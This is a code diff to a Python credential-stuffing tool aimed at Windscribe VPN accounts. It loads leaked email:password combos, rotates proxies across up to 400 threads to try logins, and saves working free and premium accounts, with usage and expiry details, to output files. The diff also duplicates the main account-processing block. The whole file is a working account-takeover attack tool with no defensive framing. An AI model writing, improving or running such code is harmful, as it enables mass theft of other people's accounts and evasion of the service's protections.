@@ -7,6 +7,8 @@ import threading
 from random import choice
 import os
 from colorama import Fore, Style
+from requests.auth import HTTPProxyAuth
+
 #Windscribe
 max_threads = 400
 account_count = 0
@@ -54,8 +56,7 @@ def check(email, password, proxy):
         "Accept-Encoding": "gzip, deflate",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-    data = {'username': username, 'password': password, 'time': unix, 'client_auth_hash': auth_hash,
-            'session_type_id': 2}
+    data = {'username': username, 'password': password, 'time': unix, 'client_auth_hash': auth_hash, 'session_type_id': 2}
 
     if len(proxy.split(":")) == 4:
         ip, port, user, pw = proxy.split(":")
@@ -75,14 +76,11 @@ def check(email, password, proxy):
                                  proxies=proxies, timeout=5)
         account_count += 1
         if response.status_code == 403 or "Could not log in with provided credentials" in response.text:
-            #print(f'Account {email}:{password} is invalid.')
             print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Account {email}:{password} is invalid. {gray}|{pink}{gray}:{pink}{password}{gray}")
         elif "session_auth_hash" not in response.text:
             print(f"{reset}[ {cyan}{reset} ] {gray}({red}-{gray}) {pretty} Error checking account {email}:{password}. {gray}|{pink}{gray}:{pink}{password}{gray}")
-            #print(f'Error checking account {email}:{password}.')
         elif "is_premium\": 0" in response.text:
-            print(f"{reset}[ {cyan}{reset} ] {gray}({lightblue}~{gray}) {pretty}Account {email}:{password} is a valid custom account.{gray}|{pink} {gray}:{pink}{password}{gray}")
-            #print(f'Account {email}:{password} is a valid custom account.')
+            print(f"{reset}[ {cyan}{reset} ] {gray}({lightblue}~{gray}) {pretty} Account {email}:{password} is a valid custom account.{gray}|{pink} {gray}:{pink}{password}{gray}")
             with open('Checked/WindScribe/free.txt', 'a') as f:
                 f.write(f'{email}:{password}\n')
         elif "is_premium\": 1" in response.text:
@@ -91,12 +89,9 @@ def check(email, password, proxy):
             username = djson["username"]
             used = f'{(((djson["traffic_used"] / 1024) / 1024) / 1024)}GB/{(((djson["traffic_max"] / 1024) / 1024) / 1024)}GB'
             expire = djson["premium_expiry_date"]
-            print(f"{reset}[ {cyan}{reset} ] {gray}({green}+{gray}) {pretty}f'This account is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}'{gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
-            #print(
-             #   f'Account {email}:{password} is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}')
+            print(f"{reset}[ {cyan}{reset} ] {gray}({green}+{gray}) {pretty} This account is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}'{gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Premium")
             with open('Checked/WindScribe/premium.txt', 'a') as f:
-                f.write(
-                    f'This account  is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}\n')
+                f.write(f'This account is a valid premium account with details: Email: {email} | Username: {username} | Used: {used} | Expire: {expire}\n')
     except requests.exceptions.RequestException as e:
         print(f"Error with proxy {proxy}: {e}")
 
@@ -109,7 +104,32 @@ def process_account(email, password):
     threading.Thread(target=check, args=(email, password, proxy)).start()
 
 
-with open('combos.txt', 'r') as file:
+with open('combos.txt', 'r', encoding='latin-1') as file:
+    accounts = [line.strip().split(':') for line in file]
+
+with open('proxies.txt', 'r') as file:
+    proxies = [line.strip() for line in file]
+
+if not os.path.exists('Checked/WindScribe'):
+    os.makedirs('Checked/WindScribe')
+
+for email, password in accounts:
+    process_account(email, password)
+
+while threading.active_count() > 1:
+    pass
+
+print(f'Successfully checked {account_count} accounts.')
+
+def process_account(email, password):
+    while threading.active_count() > max_threads:
+        pass
+
+    proxy = choice(proxies)
+    threading.Thread(target=check, args=(email, password, proxy)).start()
+
+
+with open('combos.txt', 'r', encoding='latin-1') as file:
     accounts = [line.strip().split(':') for line in file]
 
 with open('proxies.txt', 'r') as file:
